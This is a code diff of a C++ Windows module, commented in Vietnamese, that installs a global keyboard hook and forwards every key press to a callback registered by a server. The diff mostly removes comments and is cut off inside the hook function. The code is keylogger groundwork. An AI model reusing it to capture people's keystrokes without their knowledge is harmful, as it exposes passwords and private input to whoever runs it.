@@ -6,34 +6,19 @@
 #pragma comment(lib, "user32.lib")
 #endif
 
-// CALLBACK do server đăng kí
 static KeyEventCallback g_callback = nullptr;
-
-// Cờ hiệu an toàn luồng để ra lệnh dừng
 static std::atomic<bool> g_isKeylogging(false);
-
-// Handle của hook
 static HHOOK g_keyboardHook = nullptr;
-
-// Luồng chạy vòng lặp message
 static std::thread g_loggerThread;
-
-// ID của luồng để có thể gửi tín hiệu dừng
 static DWORD g_loggerThreadId = 0;
 
-// Gửi sự kiện phím
 void logKey(int key)
 {
-    // Gửi CALLBACK
     if (g_callback)
         g_callback(key);
 }
 
-// === HÀM HOOK CALLBACK ===
-
-/**
- * @brief Đây là hàm mà Windows gọi mỗi khi có phím được nhấn.
- */
+// Hàm hook callback của Windows
 LRESULT CALLBACK keyboardProc(int code, WPARAM wParam, LPARAM lParam)
 {
     if (code == HC_ACTION &&
